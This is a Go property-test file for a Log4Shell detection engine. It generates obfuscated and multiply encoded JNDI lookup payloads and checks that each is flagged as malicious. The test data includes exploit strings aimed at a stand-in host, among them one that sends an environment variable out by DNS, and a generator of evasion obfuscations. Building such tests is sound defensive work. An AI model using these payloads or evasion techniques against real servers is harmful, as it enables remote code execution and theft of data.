package engine

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"fmt"
	"math/rand/v2"
	"net/url"
	"strings"
	"testing"
	"unicode/utf8"
)

// Property tests: instead of fixed examples, generate many inputs from a seeded
// random source and check invariants. Seeds are fixed so failures reproduce;
// the failing seed and input are in the message.

func newRand(seed uint64) *rand.Rand {
	return rand.New(rand.NewPCG(seed, seed*2654435761+1))
}

// obfuscateChar returns Log4j syntax that evaluates to c (a letter or symbol).
func obfuscateChar(r *rand.Rand, c byte, depth int) string {
	s := string(c)
	isLetter := 'a' <= c && c <= 'z' || 'A' <= c && c <= 'Z'
	for tries := 0; ; tries++ {
		switch r.IntN(8) {
		case 0:
			return s
		case 1:
			if isLetter {
				return "${lower:" + strings.ToLower(s) + "}"
			}
		case 2:
			if isLetter {
				return "${upper:" + strings.ToUpper(s) + "}"
			}
		case 3:
			return "${::-" + s + "}"
		case 4:
			return "${env:NOSUCH_" + fmt.Sprint(r.IntN(1000)) + ":-" + s + "}"
		case 5:
			return "${sys:nosuch.prop:-" + s + "}"
		case 6:
			if isLetter {
				return "${date:'" + s + "'}"
			}
		case 7:
			if depth < 3 {
				return "${::-" + obfuscateChar(r, c, depth+1) + "}"
			}
		}
		if tries > 20 {
			return s
		}
	}
}

func obfuscate(r *rand.Rand, text string) string {
	var b strings.Builder
	for i := 0; i < len(text); i++ {
		b.WriteString(obfuscateChar(r, text[i], 0))
	}
	return b.String()
}

// Any obfuscation of the lookup prefix, scheme and key characters must resolve
// to the same attack and be blocked.
func TestPropertyObfuscationNeverHidesJNDI(t *testing.T) {
	r := newRand(1)
	plain := "jndi:ldap://x.invalid/a"
	for i := 0; i < 3000; i++ {
		in := "${" + obfuscate(r, plain) + "}"
		v := Inspect(newReq("GET", "/", "User-Agent", in), Config{})
		if v.Decision != DecisionMalicious {
			t.Fatalf("iteration %d: obfuscation escaped: %s -> %s %v", i, in, v.Decision, ruleSet(v))
		}
	}
}

// Same, with random obfuscation of only some characters (partial obfuscation
// is the common real-world shape).
func TestPropertyPartialObfuscation(t *testing.T) {
	r := newRand(2)
	for i := 0; i < 3000; i++ {
		var b strings.Builder
		b.WriteString("${")
		for _, c := range []byte("jndi") {
			if r.IntN(2) == 0 {
				b.WriteString(obfuscateChar(r, c, 0))
			} else {
				b.WriteByte(c)
			}
		}
		b.WriteString(":ldap://x.invalid/a}")
		v := Inspect(newReq("GET", "/", "X-Api-Version", b.String()), Config{})
		if v.Decision != DecisionMalicious {
			t.Fatalf("iteration %d: %s -> %s %v", i, b.String(), v.Decision, ruleSet(v))
		}
	}
}

// stripControl removes bytes that cannot appear in an HTTP header value.
func stripControl(s string) string {
	b := make([]byte, 0, len(s))
	for i := 0; i < len(s); i++ {
		if s[i] >= 0x20 && s[i] != 0x7f {
			b = append(b, s[i])
		}
	}
	return string(b)
}

type encoder struct {
	name string
	fn   func(string) string
}

func gzipText(s string) string {
	var buf bytes.Buffer
	zw := gzip.NewWriter(&buf)
	_, _ = zw.Write([]byte(s))
	_ = zw.Close()
	return buf.String()
}

var encoders = []encoder{
	{"percent", url.QueryEscape},
	{"percent-all", func(s string) string {
		var b strings.Builder
		for i := 0; i < len(s); i++ {
			fmt.Fprintf(&b, "%%%02X", s[i])
		}
		return b.String()
	}},
	{"percent-u", func(s string) string {
		var b strings.Builder
		for _, c := range s {
			fmt.Fprintf(&b, "%%u%04x", c)
		}
		return b.String()
	}},
	{"html", func(s string) string {
		var b strings.Builder
		for _, c := range s {
			fmt.Fprintf(&b, "&#%d;", c)
		}
		return b.String()
	}},
	{"html-hex", func(s string) string {
		var b strings.Builder
		for _, c := range s {
			fmt.Fprintf(&b, "&#x%X;", c)
		}
		return b.String()
	}},
	{"backslash-u", func(s string) string {
		var b strings.Builder
		for _, c := range s {
			fmt.Fprintf(&b, "\\u%04x", c)
		}
		return b.String()
	}},
	{"backslash-x", func(s string) string {
		var b strings.Builder
		for i := 0; i < len(s); i++ {
			fmt.Fprintf(&b, "\\x%02x", s[i])
		}
		return b.String()
	}},
	{"base64", func(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }},
	{"base64-url-raw", func(s string) string { return base64.RawURLEncoding.EncodeToString([]byte(s)) }},
	{"gzip-base64", func(s string) string { return base64.StdEncoding.EncodeToString([]byte(gzipText(s))) }},
	{"utf16le", func(s string) string {
		var b []byte
		for i := 0; i < len(s); i++ {
			b = append(b, s[i], 0)
		}
		return string(b)
	}},
	{"fullwidth-dollar-brace", func(s string) string {
		s = strings.ReplaceAll(s, "$", "＄")
		s = strings.ReplaceAll(s, "{", "｛")
		return strings.ReplaceAll(s, "}", "｝")
	}},
	{"overlong-dollar-brace", func(s string) string {
		s = strings.ReplaceAll(s, "$", "\xc0\xa4")
		s = strings.ReplaceAll(s, "{", "\xc1\xbb")
		return strings.ReplaceAll(s, "}", "\xc1\xbd")
	}},
}

// Any chain of up to three encodings of an attack, in any request location the
// engine reads, is caught. (Encodings whose output is not safe in a header or
// query, such as raw UTF-16, are used in the body instead.)
func TestPropertyEncodingChainsNeverHideJNDI(t *testing.T) {
	r := newRand(3)
	payloads := []string{
		"${jndi:ldap://x.invalid/a}",
		"${${lower:j}ndi:rmi://x.invalid/a}",
		"${jndi:dns://${env:USER}.x.invalid}",
	}
	for i := 0; i < 4000; i++ {
		s := payloads[r.IntN(len(payloads))]
		var names []string
		n := 1 + r.IntN(3)
		for j := 0; j < n; j++ {
			e := encoders[r.IntN(len(encoders))]
			// Raw-byte encodings go last: the character-level encoders would mangle
			// invalid UTF-8, and a base64 layer over UTF-16 is not a combination any
			// stack performs.
			for j < n-1 && (e.name == "utf16le" || strings.HasPrefix(e.name, "overlong")) {
				e = encoders[r.IntN(len(encoders))]
			}
			s = e.fn(s)
			names = append(names, e.name)
		}
		var req Request
		switch r.IntN(3) {
		case 0:
			req = withBody(newReq("POST", "/"), "text/plain", s)
		case 1:
			req = newReq("GET", "/", "X-Data", stripControl(s))
			if !strings.Contains(strings.Join(names, ","), "utf16le") {
				break
			}
			req = withBody(newReq("POST", "/"), "text/plain", s)
		default:
			req = newReq("GET", "/?q="+url.QueryEscape(s))
		}
		v := Inspect(req, Config{})
		if v.Decision != DecisionMalicious {
			t.Fatalf("iteration %d: chain %v escaped: %q -> %s %v", i, names, s, v.Decision, ruleSet(v))
		}
	}
}

// Embedding an attack in arbitrary surrounding text never makes it harmless.
func TestPropertyEmbeddingKeepsDetection(t *testing.T) {
	r := newRand(4)
	g := []string{"hello", "Mozilla/5.0 (X11)", "a b c", "{", "}", "$", "}}${", "%", "''", "\"", "\\", "&", ":", "-", "\n", "\t", "😀"}
	for i := 0; i < 3000; i++ {
		pre, post := "", ""
		for j := r.IntN(5); j > 0; j-- {
			pre += g[r.IntN(len(g))]
		}
		for j := r.IntN(5); j > 0; j-- {
			post += g[r.IntN(len(g))]
		}
		in := pre + "${jndi:ldap://x.invalid/a}" + post
		// "${" immediately before could change grouping; whatever the text, the
		// final lookup is still evaluable or the opener still unterminated.
		v := Inspect(newReq("GET", "/", "Referer", in), Config{})
		if v.Decision != DecisionMalicious {
			t.Fatalf("iteration %d: embedded attack escaped: %q -> %s %v", i, in, v.Decision, ruleSet(v))
		}
	}
}

// Adding data to a request never lowers the decision (monotonicity), unless a
// budget changes the picture.
func TestPropertyMonotonic(t *testing.T) {
	r := newRand(5)
	base := []Request{
		newReq("GET", "/?q=${env:HOME}"),
		newReq("GET", "/", "User-Agent", "${jndi:ldap://x.invalid/a}"),
		newReq("GET", "/ok"),
		newReq("GET", "/", "X", "${a:${a:${a:${a:x}}}}"),
	}
	extras := []Header{{"X-Extra", "hello"}, {"Accept", "*/*"}, {"Cookie", "a=b"}, {"X-Json", `{"a":1}`}, {"Referer", "https://example.com/?q=%20"}}
	for i := 0; i < 400; i++ {
		b := base[r.IntN(len(base))]
		before := Inspect(b, Config{})
		more := b
		more.Headers = append(append([]Header{}, b.Headers...), extras[r.IntN(len(extras))], extras[r.IntN(len(extras))])
		after := Inspect(more, Config{})
		if after.Decision < before.Decision {
			t.Fatalf("adding headers lowered %s to %s", before.Decision, after.Decision)
		}
	}
}

// Text with no "${" and no encoding punctuation never produces a finding, and
// stays well inside every budget.
func TestPropertyPlainTextIsClean(t *testing.T) {
	r := newRand(6)
	alphabet := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 .,;:!?-_/=@#()[]<>'\"\n"
	for i := 0; i < 3000; i++ {
		n := r.IntN(400)
		b := make([]byte, n)
		for j := range b {
			b[j] = alphabet[r.IntN(len(alphabet))]
		}
		res := Resolve(string(b), Limits{})
		if len(res.Findings) != 0 || len(res.Lookups) != 0 || !res.Complete() {
			t.Fatalf("plain text produced lookups: %q -> %+v", b, res)
		}
		if v := Inspect(newReq("POST", "/", "Content-Type", "text/plain"), Config{}); v.Decision != DecisionClean {
			t.Fatalf("empty request not clean: %v", v.Decision)
		}
	}
}

// Defang: output is printable ASCII without "${", and is reversible by percent
// decoding when not truncated.
func TestPropertyDefang(t *testing.T) {
	r := newRand(7)
	pieces := []string{"$", "{", "}", "${", "%", "%7B", "a", " ", "\n", "\x00", "é", "😀", "\xff", "jndi"}
	for i := 0; i < 5000; i++ {
		var b strings.Builder
		for j := r.IntN(30); j >= 0; j-- {
			b.WriteString(pieces[r.IntN(len(pieces))])
		}
		s := b.String()
		out := Defang(s, 0)
		if strings.Contains(out, "${") {
			t.Fatalf("Defang(%q) = %q contains ${", s, out)
		}
		for _, c := range []byte(out) {
			if c < 0x20 || c >= 0x7f {
				t.Fatalf("Defang(%q) = %q is not printable ASCII", s, out)
			}
		}
		back, err := url.PathUnescape(out)
		if err != nil || back != s {
			t.Fatalf("Defang(%q) = %q does not round-trip (%q, %v)", s, out, back, err)
		}
		if cut := Defang(s, 5); len(cut) > 5+3+3 { // cap plus the ellipsis plus one escape
			t.Fatalf("Defang(%q, 5) = %q is too long", s, cut)
		}
	}
}

// Decode invariants over random input: the original is first, there are no
// duplicates, paths respect MaxDepth, and results are deterministic.
func TestPropertyDecodeInvariants(t *testing.T) {
	r := newRand(8)
	pieces := []string{"%24", "%7B", "%25", "$", "{", "jndi", "&#36;", "\\u0024", "%u0024", "AAAA", "\x00", "é", "\xc0\xa4", "=", "+", "/"}
	lim := Limits{MaxDepth: 4}
	for i := 0; i < 2000; i++ {
		var b strings.Builder
		for j := r.IntN(12); j >= 0; j-- {
			b.WriteString(pieces[r.IntN(len(pieces))])
		}
		in := b.String()
		a, c := Decode(in, lim), Decode(in, lim)
		if len(a.Stages) == 0 || a.Stages[0].Text != in || len(a.Stages[0].Path) != 0 {
			t.Fatalf("first stage is not the original for %q", in)
		}
		seen := map[string]bool{}
		for _, st := range a.Stages {
			if seen[st.Text] {
				t.Fatalf("duplicate stage %q for %q", st.Text, in)
			}
			seen[st.Text] = true
			if len(st.Path) > 4 {
				t.Fatalf("path %v exceeds MaxDepth for %q", st.Path, in)
			}
		}
		if len(a.Stages) != len(c.Stages) || a.Exhausted != c.Exhausted {
			t.Fatalf("Decode is not deterministic for %q", in)
		}
	}
}

// Valid UTF-8 text with no encoding syntax survives decoding unchanged.
func TestPropertyDecodeLeavesPlainUTF8Alone(t *testing.T) {
	r := newRand(9)
	pieces := []string{"a", "b", " ", "é", "漢", "😀", ".", "-", ":", "/"}
	for i := 0; i < 1000; i++ {
		var b strings.Builder
		for j := r.IntN(40); j >= 0; j-- {
			b.WriteString(pieces[r.IntN(len(pieces))])
		}
		in := b.String()
		if !utf8.ValidString(in) {
			t.Fatal("generator produced invalid UTF-8")
		}
		if res := Decode(in, Limits{}); len(res.Stages) != 1 {
			t.Fatalf("plain text %q gained stages: %q", in, res.Stages)
		}
	}
}
